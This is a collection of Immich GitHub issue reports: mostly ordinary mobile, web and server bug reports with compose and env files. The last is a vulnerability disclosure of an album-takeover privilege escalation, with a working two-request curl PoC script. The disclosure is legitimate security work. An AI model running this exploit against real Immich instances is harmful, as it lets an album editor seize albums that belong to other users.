title: [Bug] iOS: Downloaded Live Photo re-uploads as video only (no HEIC sent)
author: VergilWen
body: ### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report. - [x] Yes ### The bug When a Live Photo is downloaded / saved to the device from the Immich iOS app, it is stored in the iPhone Photos library as two independent assets — a .HEIC still image and a .MOV video — instead of a single bundled Live Photo (PHAsset carrying both .photo and .pairedVideo resources). A clear symptom shows up in the Immich app's upload/backup picker: an original Live Photo appears as IMG_XXXX.HEIC (image asset), while the downloaded copy of the same item appears as IMG_XXXX.MOV (video asset). Because the downloaded item is effectively a video-type asset, re-uploading it back to Immich sends only the MOV (the photo/HEIC side is never transmitted), so the result displays incorrectly as a plain video in both the app and on the web (its thumbnail becomes a garbled, unrelated image). A camera-native / original Live Photo uploads correctly (both HEIC + MOV are sent and paired), so the server is not at fault — the problem is in how the app saves the downloaded Live Photo to the Photos library. ### The OS that Immich Server is running on QNAP QTS 5.2.9 (QuTS hero) ### Version of Immich Server v3.0.2 ### Version of Immich Mobile App v3.0.2 ### Platform with the issue - [ ] Server - [ ] Web - [x] Mobile ### Device make and model iPhone17 ### Your docker-compose.yml content ```YAML name: immich services: immich-server: container_name: immich_server image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release} extends: file: hwaccel.transcoding.yml service: quicksync volumes: - ${UPLOAD_LOCATION}:/data - /etc/localtime:/etc/localtime:ro env_file: - .env ports: - "2283:2283" depends_on: - redis - database restart: always healthcheck: disable: false immich-machine-learning: container_name: immich_machine_learning image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release} volumes: - model-cache:/cache env_file: - .env restart: always healthcheck: disable: false redis: container_name: immich_redis image: docker.io/valkey/valkey:9 healthcheck: test: redis-cli ping || exit 1 restart: always database: container_name: immich_postgres image: ghcr.io/immich-app/postgres:14-vectorchord0.4.3-pgvectors0.2.0 environment: POSTGRES_PASSWORD: ${DB_PASSWORD} POSTGRES_USER: ${DB_USERNAME} POSTGRES_DB: ${DB_DATABASE_NAME} POSTGRES_INITDB_ARGS: "--data-checksums" volumes: - ${DB_DATA_LOCATION}:/var/lib/postgresql/data shm_size: 128mb restart: always healthcheck: disable: false volumes: model-cache: ``` ### Your .env content ```Shell UPLOAD_LOCATION=/var/lib/immich/library DB_DATA_LOCATION=/var/lib/postgresql/data TZ=Asia/Shanghai IMMICH_VERSION=v3.0.2 DB_PASSWORD=password DB_USERNAME=postgres DB_DATABASE_NAME=immich ``` ### Reproduction steps 1. In the Immich iOS app, open a proper Live Photo (HEIC + MOV, originally uploaded from the device/camera). 2. Use the app's download / save to device action to save it into the iPhone Photos library. 3. Open the iPhone Photos app and confirm it displays/plays as a normal Live Photo. (Expected — the native Photos app is fine; the defect only appears inside Immich.) 4. In the Immich app, open the backup / upload picker (or "recent") and locate that same downloaded item. Here the broken state is already visible: it shows as IMG_XXXX.MOV (video type) instead of IMG_XXXX.HEIC (image type) — before any upload even happens. 5. Select it to upload back to the server, then inspect the resulting asset in the web UI. Expected: re-uploading transmits both HEIC + MOV and pairs them correctly as a Live Photo (same as an original Live Photo). Actual: the picker shows the downloaded item as a .MOV video; re-uploading sends only the MOV, so the server gets a video-only asset (no HEIC). Reproducibility: 100% — every Live Photo downloaded from Immich and re-uploaded behaves this way; the failure is consistent, not intermittent. ### Relevant log output ```shell ``` ### Additional information This is very likely the same root issue as #18961 (iOS Live Photos uploaded as .mov only, no .heic), but it reproduces 100% here, and I'm providing detailed steps plus server-side evidence to help pinpoint the cause. It is very disruptive in daily use: any Live Photo downloaded from Immich and then re-uploaded is silently degraded into a plain video, with no warning shown in the app. Fact — the downloaded files are complete: when the iPhone is connected to a computer, both IMG_XXXX.HEIC and IMG_XXXX.MOV are visible in the same location. This proves the download itself is intact (both the photo and video sides exist on disk); the issue is that the app keeps them as two separate, unpaired assets, so the upload picker only sees the video side.

title: Since Update 3, Pictures pre 2017 and asia missing
author: trytogetme85
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

 Hey, Last week I updated my immich stack to 3.0, but now I realize that al pictures from before 2017 are missing. I dont find any photos of my 3 trips to asia (Vientam, Malaysia, Taiawan..) They where in 2015, 2018 and 2023 all are not in my Gallery..

So I just finnished the metadata-job, and rescan of my external library...still not there.
So I restored the old 2.7.5 database from the Immich-settings. All pictures are back. But after one night, all are gone again.

### The OS that Immich Server is running on

Ubuntu 24.04.4 LTS (Noble Numbat)

### Version of Immich Server

3.0.2

### Version of Immich Mobile App

3.0.2

### Platform with the issue

- [x] Server
- [x] Web
- [x] Mobile

### Device make and model

Samsung S25

### Your docker-compose.yml content

```YAML
#
# WARNING: To install Immich, follow our guide: https://docs.immich.app/install/docker-compose
#
# Make sure to use the docker-compose.yml of the current release:
#
# https://github.com/immich-app/immich/releases/latest/download/docker-compose.yml
#
# The compose file on main may not be compatible with the latest release.

name: immich

services:
  immich-server:
    container_name: immich_server
    image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release}
    # extends:
    #   file: hwaccel.transcoding.yml
    #   service: cpu # set to one of [nvenc, quicksync, rkmpp, vaapi, vaapi-wsl] for accelerated transcoding
    volumes:
      # Do not edit the next line. If you want to change the media storage location on your system, edit the value of UPLOAD_LOCATION in the .env file
      - ${UPLOAD_LOCATION}:/data
      - /etc/localtime:/etc/localtime:ro
    env_file:
      - .env
    ports:
      - '2283:2283'
    depends_on:
      - redis
      - database
    restart: always
    healthcheck:
      disable: false

  immich-machine-learning:
    container_name: immich_machine_learning
    # For hardware acceleration, add one of -[armnn, cuda, rocm, openvino, rknn] to the image tag.
    # Example tag: ${IMMICH_VERSION:-release}-cuda
    image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release}
    # extends: # uncomment this section for hardware acceleration - see https://docs.immich.app/features/ml-hardware-acceleration
    #   file: hwaccel.ml.yml
    #   service: cpu # set to one of [armnn, cuda, rocm, openvino, openvino-wsl, rknn] for accelerated inference - use the `-wsl` version for WSL2 where applicable
    volumes:
      - model-cache:/cache
    env_file:
      - .env
    restart: always
    healthcheck:
      disable: false

  redis:
    container_name: immich_redis
    image: docker.io/valkey/valkey:9@sha256:4963247afc4cd33c7d3b2d2816b9f7f8eeebab148d29056c2ca4d7cbc966f2d9
    healthcheck:
      test: redis-cli ping || exit 1
    restart: always

  database:
    container_name: immich_postgres
    image: ghcr.io/immich-app/postgres:14-vectorchord0.4.3-pgvectors0.2.0@sha256:bcf63357191b76a916ae5eb93464d65c07511da41e3bf7a8416db519b40b1c23
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD}
      POSTGRES_USER: ${DB_USERNAME}
      POSTGRES_DB: ${DB_DATABASE_NAME}
      POSTGRES_INITDB_ARGS: '--data-checksums'
      # Uncomment the DB_STORAGE_TYPE: 'HDD' var if your database isn't stored on SSDs
      # DB_STORAGE_TYPE: 'HDD'
    volumes:
      # Do not edit the next line. If you want to change the database storage location on your system, edit the value of DB_DATA_LOCATION in the .env file
      - ${DB_DATA_LOCATION}:/var/lib/postgresql/data
    shm_size: 128mb
    restart: always
    healthcheck:
      disable: false

volumes:
  model-cache:
```

### Your .env content

```Shell
# You can find documentation for all the supported env variables at https://docs.immich.app/install/environment-variables

# The location where your uploaded files are stored
UPLOAD_LOCATION=/mnt/immich/upload

# The location where your database files are stored. Network shares are not supported for the database
DB_DATA_LOCATION=./postgres

# To set a timezone, uncomment the next line and change Etc/UTC to a TZ identifier from this list: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones#List
# TZ=Etc/UTC

# The Immich version to use. You can pin this to a specific version like "v2.1.0"
IMMICH_VERSION=release

# Connection secret for postgres. You should change it to a random password
# Please use only the characters `A-Za-z0-9`, without special characters or spaces
DB_PASSWORD=postgres

# The values below this line do not need to be changed
###################################################################################
DB_USERNAME=postgres
DB_DATABASE_NAME=immich
```

### Reproduction steps

1.Update from 2.7.5 ->3.0.0->3.0.2
2.Pictures gone
3.Restore DB fom 2.7.5 in 3.0.2
4.Pictures are back
5.Sleep one night
6. Pictures gone
...

```shell

```

title: New images (random) not being backed up or visible in mobile app
author: moshechaikin
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

New images not loading in immich timeline and are not being backed up. Some random images and videos that are newer have been backed up but it’s mostly not working. 

### The OS that Immich Server is running on

macOS (Orbstack)

### Version of Immich Server

3.0.2

### Version of Immich Mobile App

3.0.2

### Platform with the issue

- [ ] Server
- [ ] Web
- [x] Mobile

### Device make and model

iPhone 13 Pro

### Your docker-compose.yml content

```YAML
# WARNING: Make sure to use the docker-compose.yml of the current release:
# https://github.com/immich-app/immich/releases/latest/download/docker-compose.yml

name: immich

services:
  immich-server:
    container_name: immich_server
    image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release}
    volumes:
      # Do not edit the next line. If you want to change the media storage location on your system, edit the value of UPLOAD_LOCATION in the .env file
      - ${UPLOAD_LOCATION}:/data
      # CUSTOM: Local SSD for thumbnails/cache
      - ${THUMB_LOCATION}:/data/thumbs
      - ${PROFILE_LOCATION}:/data/profile
      # CUSTOM: External library - SMB mount (read-only)
      - "/Users/moshe/path/:/mnt/external/path:ro"
      - /etc/localtime:/etc/localtime:ro
    env_file:
      - .env
    ports:
      - '2283:2283'
    depends_on:
      - redis
      - database
    restart: always
    healthcheck:
      disable: false

  immich-machine-learning:
    container_name: immich_machine_learning
    image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release}
    volumes:
      - model-cache:/cache
    env_file:
      - .env
    restart: always
    healthcheck:
      disable: false

  redis:
    container_name: immich_redis
    image: docker.io/valkey/valkey:9@sha256:546304417feac0874c3dd576e0952c6bb8f06bb4093ea0c9ca303c73cf458f63
    healthcheck:
      test: redis-cli ping || exit 1
    restart: always

  database:
    container_name: immich_postgres
    image: ghcr.io/immich-app/postgres:14-vectorchord0.4.3-pgvectors0.2.0@sha256:bcf63357191b76a916ae5eb93464d65c07511da41e3bf7a8416db519b40b1c23
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD}
      POSTGRES_USER: ${DB_USERNAME}
      POSTGRES_DB: ${DB_DATABASE_NAME}
      POSTGRES_INITDB_ARGS: '--data-checksums'
    volumes:
      # Do not edit the next line. If you want to change the database storage location on your system, edit the value of DB_DATA_LOCATION in the .env file
      - ${DB_DATA_LOCATION}:/var/lib/postgresql/data
    shm_size: 128mb
    restart: always
    healthcheck:
      disable: false
  # Immich Public Proxy for sharing albums publicly through Cloudflare Tunnel
  immich-public-proxy:
    image: alangrainger/immich-public-proxy:latest
    container_name: immich-public-proxy
    restart: always
    ports:
      - "3000:3000"
    environment:
      PUBLIC_BASE_URL: https://mycustomdomain.com
      CONFIG: |
        {
          "ipp": {
            "responseHeaders": {
              "Cache-Control": "public, max-age=2592000",
              "Access-Control-Allow-Origin": "*"
            },
            "maxDownloadQuality": "original",
            "maxZoomQuality": "fullsize",
            "downloadedFilename": 0,
            "allowDownload": 1,
            "allowSlugLinks": true,
            "showHomePage": false,
            "customInvalidResponse": false,
            "gallery": {
              "singleImage": false,
              "singleItemAutoOpen": true,
              "showTitle": true,
              "showDescription": true
            },
            "lightbox": {
              "showDownload": true
            },
            "showMetadata": {
              "description": {
                "caption": true,
                "sidebar": true
              }
            }
          }
        }
    healthcheck:
      test: curl -s http://localhost:3000/share/healthcheck -o /dev/null || exit 1
      start_period: 10s
      timeout: 5s
  # CUSTOM: Watchtower for automatic Immich updates on Mac Mini
  watchtower:
    container_name: watchtower
    image: nickfedor/watchtower:latest
    restart: always
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - WATCHTOWER_SCHEDULE=0 0 5 * * *
      - WATCHTOWER_CLEANUP=true
      - TZ=America/New_York

volumes:
  model-cache:
```

### Your .env content

```Shell
# You can find documentation for all the supported env variables at https://docs.immich.app/install/environment-variables

# The location where your uploaded files are stored
UPLOAD_LOCATION=/Users/moshe/mnt/Immich-Uploads
# Custom locations for thumbnails/cache on local SSD
THUMB_LOCATION=/Users/moshe/Immich/library/thumbs
PROFILE_LOCATION=/Users/moshe/Immich/library/profile

# The location where your database files are stored. Network shares are not supported for the database
DB_DATA_LOCATION=/Users/moshe/Immich/postgres
# To set a timezone, uncomment the next line and change Etc/UTC to a TZ identifier from this list: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones#List
TZ=America/New_York

# The Immich version to use. You can pin this to a specific version like "v2.1.0"
IMMICH_VERSION=v3

# Connection secret for postgres. You should change it to a random password
# Please use only the characters `A-Za-z0-9`, without special characters or spaces
DB_PASSWORD=RANDOMIZETHIS

# The values below this line do not need to be changed
###################################################################################
DB_USERNAME=postgres
DB_DATABASE_NAME=immich

# Additional vars
MACHINE_LEARNING_MODEL_TTL=0
MACHINE_LEARNING_PRELOAD__CLIP__TEXTUAL=nllb-clip-large-siglip__mrl
```

### Reproduction steps

1. Take new picture
2. Open immich mobile app (with backup enabled)
3. New photos not appearing in grid or in pending backup
...

author: FreeWind6
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

When you open link on iOS https://my.immich.app/albums/1191800e-ac2f-44df-ae68-3e8004453360?instanceUrl=https://myhost.com **OR** https://my.immich.app/photos/1fb5397a-ab93-4c9b-af4c-aa1a9e66afb4?instanceUrl=https://myhost.com then it doesn't open in the mobile app.

### The OS that Immich Server is running on

TrueNas

### Version of Immich Server

v3.0.2

### Version of Immich Mobile App

v3.0.2

### Platform with the issue

- [ ] Server
- [ ] Web
- [x] Mobile

### Device make and model

iPhone 17 Pro

### Your docker-compose.yml content

```YAML
TrueNas
```

### Your .env content

```Shell
TrueNas
```

### Reproduction steps

1. Download the app on iOS
2. Open link https://my.immich.app/albums/1191800e-ac2f-44df-ae68-3e8004453360?instanceUrl=https://myhost.com **OR** https://my.immich.app/photos/1fb5397a-ab93-4c9b-af4c-aa1a9e66afb4?instanceUrl=https://myhost.com
3. The link opens in the browser, not in the mobile app.

```shell
App not started
```

The error appeared after upgrading to v3

title: immich_machine_learning container constantly restarts
author: 16WhatIsLove16
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

After upgrading from version 2.7.5 to version 3.0.2, the immich_machine_learning container stopped starting. Exit code 132

### The OS that Immich Server is running on

Debian 13

### Version of Immich Server

3.0.2

### Version of Immich Mobile App

3.0.2

### Platform with the issue

- [x] Server
- [ ] Web
- [ ] Mobile

### Device make and model

_No response_

### Your docker-compose.yml content

```YAML
#
# WARNING: To install Immich, follow our guide: https://docs.immich.app/install/docker-compose
#
# Make sure to use the docker-compose.yml of the current release:
#
# https://github.com/immich-app/immich/releases/latest/download/docker-compose.yml
#
# The compose file on main may not be compatible with the latest release.

name: immich

services:
  immich-server:
    container_name: immich_server
    image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release}
    # extends:
    #   file: hwaccel.transcoding.yml
    #   service: cpu # set to one of [nvenc, quicksync, rkmpp, vaapi, vaapi-wsl] for accelerated transcoding
    volumes:
      # Do not edit the next line. If you want to change the media storage location on your system, edit the value of UPLOAD_LOCATION in the .env file
      - ${UPLOAD_LOCATION}:/data
      - /etc/localtime:/etc/localtime:ro
    env_file:
      - .env
    ports:
      - '2283:2283'
    depends_on:
      - redis
      - database
    restart: always
    healthcheck:
      disable: false

  immich-machine-learning:
    container_name: immich_machine_learning
    # For hardware acceleration, add one of -[armnn, cuda, rocm, openvino, rknn] to the image tag.
    # Example tag: ${IMMICH_VERSION:-release}-cuda
    image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release}
    # extends: # uncomment this section for hardware acceleration - see https://docs.immich.app/features/ml-hardware-acceleration
    #   file: hwaccel.ml.yml
    #   service: cpu # set to one of [armnn, cuda, rocm, openvino, openvino-wsl, rknn] for accelerated inference - use the `-wsl` version for WSL2 where applicable
    volumes:
      - model-cache:/cache
    env_file:
      - .env
    restart: always
    healthcheck:
      disable: false

  redis:
    container_name: immich_redis
    image: docker.io/valkey/valkey:8-bookworm@sha256:fea8b3e67b15729d4bb70589eb03367bab9ad1ee89c876f54327fc7c6e618571
    healthcheck:
      test: redis-cli ping || exit 1
    restart: always

  database:
    container_name: immich_postgres
    image: ghcr.io/immich-app/postgres:14-vectorchord0.4.3-pgvectors0.2.0@sha256:41eacbe83eca995561fe43814fd4891e16e39632806253848efaf04d3c8a8b84
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD}
      POSTGRES_USER: ${DB_USERNAME}
      POSTGRES_DB: ${DB_DATABASE_NAME}
      POSTGRES_INITDB_ARGS: '--data-checksums'
      # Uncomment the DB_STORAGE_TYPE: 'HDD' var if your database isn't stored on SSDs
      # DB_STORAGE_TYPE: 'HDD'
    volumes:
      # Do not edit the next line. If you want to change the database storage location on your system, edit the value of DB_DATA_LOCATION in the .env file
      - ${DB_DATA_LOCATION}:/var/lib/postgresql/data
    shm_size: 128mb
    restart: always

volumes:
  model-cache:
```

### Your .env content

```Shell
# You can find documentation for all the supported env variables at https://docs.immich.app/install/environment-variables

# The location where your uploaded files are stored
UPLOAD_LOCATION=./library

# The location where your database files are stored. Network shares are not supported for the database
DB_DATA_LOCATION=./postgres

# To set a timezone, uncomment the next line and change Etc/UTC to a TZ identifier from this list: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones#List
# TZ=Etc/UTC

# The Immich version to use. You can pin this to a specific version like "v1.71.0"
IMMICH_VERSION=release

# Connection secret for postgres. You should change it to a random password
# Please use only the characters `A-Za-z0-9`, without special characters or spaces
DB_PASSWORD=postgres
```

title: Immich firefox editor save bug report
author: TNNutcase
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

Saving an edit made in the web editor (tested with horizontal flip/mirror, on selfie-style photos that needed un-mirroring) silently fails to apply on the first save attempt, and sometimes the second. It takes 2-3 clicks of "Save" before the edit actually takes effect and the UI reflects it. No error toast or console error appears during the failed attempts.

This only happens in Firefox. The identical operation on the identical asset, from the same machine, saves correctly on the first attempt in Brave and Safari.

**Root cause identified:** Firefox's Enhanced Tracking Protection, set to **Strict**, blocks canvas data extraction for the Immich origin until the site is granted an explicit permission exception. The web editor relies on canvas/CSS-based rendering for its live preview and save pipeline. Adding a per-site ETP exception for the Immich origin (via the shield icon in the address bar → turn off Enhanced Tracking Protection for this site) immediately and permanently fixed the issue — edits now save on the first click.

Since Immich gave no indication of *why* the save wasn't applying (no error message, no console warning), this took a while to isolate. Filing so the team is aware, and in case a better UX is possible (e.g. detecting blocked canvas access and surfacing a clear message, rather than a silent no-op).




## Actual behavior

Save appears to do nothing for 1-2 attempts with no error feedback, then succeeds on a subsequent attempt.

## Environment

- **Immich Server version:** v3.0.2
- **Platform:** Web
- **Deployment:** Docker on Synology NAS (DS920+)
- **Access method:** Direct IP:port (e.g. `http://<nas-ip>:2283`), no reverse proxy involved
- **Browser:** Firefox, [fill in version from `about:support`]
  - Enhanced Tracking Protection: **Strict** (reproduces bug)
  - Confirmed fixed with a per-site ETP exception for the Immich origin
- **Cross-browser testing:** Brave and Safari on the same machine, same asset, same operation — both save correctly on the first attempt. Issue is isolated to Firefox + Strict ETP.

## Additional information

- No relevant errors appeared in `immich_server` logs or the Firefox Console tab during the failed attempts — the failure is silent on both ends, consistent with the canvas permission being blocked client-side before any save request meaningfully completes/reflects in the UI.
- Suspect this affects any editor operation that depends on canvas readback, not just flip — happy to test rotate/crop/adjust if useful for triage.
- Workaround for other users hitting this: add a Firefox per-site exception for your Immich origin (shield icon in the address bar → toggle off Enhanced Tracking Protection for this site), or set ETP to Standard globally.

title: [Bug Report] Ghost header "2027" appears in mobile app timeline despite clean database and metadata
author: TenLyAThony
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug
[Bug Report] Ghost "2027" date header with 1 asset in mobile timeline; deleting it causes the next asset to jump into 2027 (Web UI is normal)
**Description**
A "2027" date header is appearing in the mobile application timeline, grouping exactly one single photo/video asset. However, there is no corresponding data existing in the database or file metadata for the year 2027. This issue is strictly isolated to the mobile app, as the Web UI renders the timeline perfectly with no 2027 header. 

Furthermore, a severe UI state issue occurs: when deleting the single asset under the 2027 header, the asset chronologically immediately below it automatically shifts up and is wrongly categorized under the 2027 header.

**Steps to Reproduce**
1. Verified file metadata using exiftool on all source assets; no files contain a 2027 timestamp.
2. Performed deep SQL queries directly on the PostgreSQL database tables (`assets` and `asset_exif`) to filter for records dated 2027 or later. 
   - Result: Both queries returned exactly `0 rows`. Server-side data is completely clean.
3. Logged into the Immich Web UI via a browser: The timeline renders flawlessly, all dates are correct, and the "2027" ghost header DOES NOT appear.
4. On the mobile client side: Cleared application cache, performed a full logout, and initiated a complete clean sync.
5. Observe the mobile timeline: The "2027" header appears, containing exactly one misindexed asset.
6. **Crucial Step:** Select and delete the single asset located under the "2027" header.
7. Observe the UI response: The asset chronologically immediately below it (e.g., from today or the previous year) automatically jumps up to take its place under the "2027" header.

**Expected Behavior**
- The mobile timeline should match the Web UI, correctly categorizing assets without rendering a ghost "2027" header.
- Deleting the asset under the 2027 header should simply remove it. The empty 2027 header should then disappear, and no other assets should be shifted or miscategorized.

**Actual Behavior**
- Mobile App: A ghost header for "2027" is displayed. Upon deleting its only asset, the UI automatically pulls the next asset up into the 2027 header.
- Web UI: Displays everything perfectly with correct chronological order.

**Logs**
Please let me know which specific logs (server docker logs or mobile client logs) you need me to extract to help debug this further. I have full access to both the server backend and container environment.

**Additional Context**
Since the database is clean and the Web UI is perfect, this is strictly a frontend state management or rendering bug exclusive to the mobile app. The timeline engine is not only misinterpreting an asset's date but also failing to correctly update the UI state after a deletion action, causing adjacent items to shift into the wrong date header.

App iphone 13: v3.0.2

title: iOS: Imported mTLS client certificate is not presented when using external server URL
author: slgfire
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

### The bug

The Immich iOS app does not present an imported mTLS client certificate when connecting to my external Immich URL.

The PKCS#12 (.p12) certificate is successfully imported in the Immich app. The app confirms that the certificate was imported successfully.

However, requests from the Immich iOS app reach Cloudflare without presenting any client certificate.

Cloudflare confirms:

cf.tls_client_auth.cert_presented = false

As a result, my mTLS firewall rule correctly blocks the request with HTTP 403.

Example blocked request:

Method: GET
Path: /api/server/ping
Protocol: HTTP/2
User-Agent: immich-ios/3.0.2
Action: block
Source: firewallCustom

The same behavior also occurs for other API endpoints, for example:

/api/users/me/preferences

### Why I use mTLS

My Immich instance is externally accessible through a Cloudflare Tunnel.

I intentionally use mTLS to ensure that only explicitly authorized devices can reach the Immich instance from the Internet without requiring a VPN.

Therefore, removing mTLS or bypassing the Immich API is not an acceptable solution for my setup.

### Expected behavior

The Immich iOS app should present the successfully imported client certificate for HTTPS requests to the configured external server URL.

### Actual behavior

The client certificate is not presented.

Cloudflare reports:

cf.tls_client_auth.cert_presented = false

The request is therefore blocked with HTTP 403.

### Platform

- Immich iOS app: 3.0.2
- iOS: 26.5.2
- Reverse proxy / external access: Cloudflare Tunnel
- mTLS enforcement: Cloudflare Custom WAF Rule
- Tested protocols: HTTP/2 and HTTP/3

### Cloudflare event example

Request:

GET /api/server/ping

User-Agent:

immich-ios/3.0.2

Cloudflare mTLS state:

cert_presented = false

Ray ID:

a19fae936b17cee6

### Additional context

The local Immich URL works correctly using Immich's automatic URL switching.

The issue only affects the external URL protected by mTLS.

### The OS that Immich Server is running on

Official Docker

### Version of Immich Server

3.0.2

### Version of Immich Mobile App

3.0.2

### Platform with the issue

- [ ] Server
- [ ] Web
- [x] Mobile

### Device make and model

iPhone 12 and 17 pro

### Your docker-compose.yml content

```YAML
immich-server:
    container_name: immich-server
    image: ghcr.io/immich-app/immich-server:release
    restart: always
    healthcheck:
      disable: false
    depends_on:
      - database
      - redis
      - immich-machine-learning
    env_file:
      - immich.env
    volumes:
      - /etc/localtime:/etc/localtime:ro
      # upload directories
      - ./data/backups:/usr/src/app/upload/backups
      - ./data/encoded-video:/usr/src/app/upload/encoded-video
      - /share/HomeDrive/Bilder/Devices:/usr/src/app/upload/library
      - ./data/profile:/usr/src/app/upload/profile
      - ./data/upload:/usr/src/app/upload/upload
      - ./data/thumbnails:/usr/src/app/upload/thumbs
    ports:
      - '30001:2283'
```

### Your .env content

```Shell
# DB_DATA_LOCATION=./data/db

# To set a timezone, uncomment the next line and change Etc/UTC to a TZ identifier from this list: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones#List
# TZ=Etc/UTC

# The Immich version to use. You can pin this to a specific version like "v1.71.0"
IMMICH_VERSION=release

DB_PASSWORD=DB_PASSWORD

# The values below this line do not need to be changed
###################################################################################
DB_USERNAME=USERNAME
DB_DATABASE_NAME=DATABASE_NAME
```

### Reproduction steps

1. Configure an Immich instance behind Cloudflare.
2. Enable mTLS client certificate validation using a Cloudflare custom firewall rule.
3. Import a valid PKCS#12 (.p12) client certificate in the Immich iOS app.
4. The Immich app reports that the certificate was imported successfully.
5. Configure the external server URL, e.g. https://fotos.example.com.
6. Connect using mobile data / an external network.
7. The request is blocked by Cloudflare.
8. Cloudflare shows `cf.tls_client_auth.cert_presented = false`.

### Relevant log output

```shell
Immich iOS log:

ApiException 403

Request:
GET /api/server/ping

Cloudflare response:
"Sorry, you have been blocked"

Cloudflare Ray ID:
a19fae936b17cee6

Cloudflare Security Event:

Protocol: HTTP/2
User-Agent: immich-ios/3.0.2
Path: /api/server/ping
Source: firewallCustom
Action: block

mTLS test result:
cf.tls_client_auth.cert_presented = false

The client certificate was successfully imported in the Immich iOS app.
```

### Additional information

- The .p12 certificate imports successfully in the Immich app.
- The certificate is valid and used for Cloudflare mTLS.
- HTTP/3 was disabled for testing.
- The issue still occurs using HTTP/2.
- The external URL can only be validated/saved while the Cloudflare mTLS block rule is temporarily disabled.
- After saving the external URL and re-enabling the mTLS rule, the Immich app still fails when connecting externally.
- Cloudflare shows that no client certificate is presented by the Immich iOS request.
- This does not appear to be a certificate verification failure. The certificate is not presented at all.

title: Album takeover / role-management privilege escalation by a shared Editor (broken access control in `updateUser`)
author: geo-chen
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [ ] Yes

### The bug

reported on 9 June 2026 via email - no response:

## Summary

`PUT /albums/:id/user/:userId` (album member role management) authorizes on `Permission.AlbumShare`, which is granted to the owner **and to any shared Editor**. The handler then unconditionally updates the target member's role, with no check that the caller is the owner, no check that the target isn't the owner, and no rejection of `role=owner`. Since album ownership is defined solely by the `album_user` row with `role='owner'`, a shared Editor can demote the real owner and promote themselves to sole Owner — full album takeover.

## Details

- Sink: `services/album.service.ts:336-339` `AlbumService.updateUser` → unconditional `albumUser.update({albumId, userId}, {role: dto.role})`.
- Over-broad gate: `utils/access.ts:201-209` — `Permission.AlbumShare` = owner OR `checkSharedAlbumAccess(..., AlbumUserRole.Editor)`.
- Route: `controllers/album.controller.ts:168-183` `PUT /albums/:id/user/:userId`, only `requireAccess({permission: AlbumShare, ids:[albumId]})`.
- Ownership def: `repositories/access.repository.ts:88` — owner = the `album_user` row with `role='owner'`.
- DTO: `dtos/album.dto.ts:88-92` `UpdateAlbumUserDto.role` accepts `owner` (no exclusion). The sibling `addUsers` (`:287`) explicitly blocks `role===Owner`; `updateUser` does not.

Exploit (Editor on the album):
1. `PUT /api/albums/{id}/user/{ownerUserId}` `{"role":"editor"}` — demotes the real owner (frees the partial-unique `album_user_unique_owner` slot).
2. `PUT /api/albums/{id}/user/me` `{"role":"owner"}` — attacker becomes sole Owner (gains AlbumUpdate/Delete/removeUser → can evict the original owner).

## PoC 

`poc_album_takeover.sh` (live two-request chain) and a vitest spec driving the **real** `requireAccess`→`checkOtherAccess(AlbumShare)` path (only the low-level `accessRepository.album.*` queries mocked to emulate an Editor): `updateUser` succeeds and issues the demote-then-promote `albumUser.update` calls. Both `PUT`s return `204`.

The codebase even has an e2e test "should not allow a shared user to change the role of another shared user" — but it only tests a **Viewer** (legitimately blocked); the **Editor** case (which passes the gate) is untested and unguarded.

poc_album_takeover.sh:
```
#!/usr/bin/env bash
# PoC: album takeover by a shared EDITOR in immich (broken access control in updateUser).
# Sink: server/src/services/album.service.ts:336 ; over-broad gate: utils/access.ts:201 (AlbumShare = owner OR Editor).
# Preconditions: a victim "owner" account, and an attacker account the owner shared an album with as role=Editor.
set -euo pipefail
IMMICH="${IMMICH:-http://localhost:2283}"
ATTACKER_TOKEN="${ATTACKER_TOKEN:?Editor's access token (Bearer)}"
ALBUM_ID="${ALBUM_ID:?album UUID shared with attacker as Editor}"
OWNER_USER_ID="${OWNER_USER_ID:?the real album owner's user UUID}"
ATTACKER_USER_ID="${ATTACKER_USER_ID:?attacker's own user UUID}"
H_AUTH="Authorization: Bearer ${ATTACKER_TOKEN}"; H_JSON="Content-Type: application/json"

echo "[*] Step 1: demote the real owner (owner -> editor) -- frees the unique-owner slot."
curl -sS -o /dev/null -w "  HTTP %{http_code}\n" -X PUT \
  "${IMMICH}/api/albums/${ALBUM_ID}/user/${OWNER_USER_ID}" -H "${H_AUTH}" -H "${H_JSON}" --data '{"role":"editor"}'

echo "[*] Step 2: promote attacker to OWNER (sole owner of the album)."
curl -sS -o /dev/null -w "  HTTP %{http_code}\n" -X PUT \
  "${IMMICH}/api/albums/${ALBUM_ID}/user/${ATTACKER_USER_ID}" -H "${H_AUTH}" -H "${H_JSON}" --data '{"role":"owner"}'

echo "[*] Verify attacker is now Owner:"
curl -sS "${IMMICH}/api/albums/${ALBUM_ID}" -H "${H_AUTH}" | grep -o '"role":"[a-z]*"' || true
# Expect both PUTs => HTTP 204, attacker's album_user row now role="owner".
```

## Impact

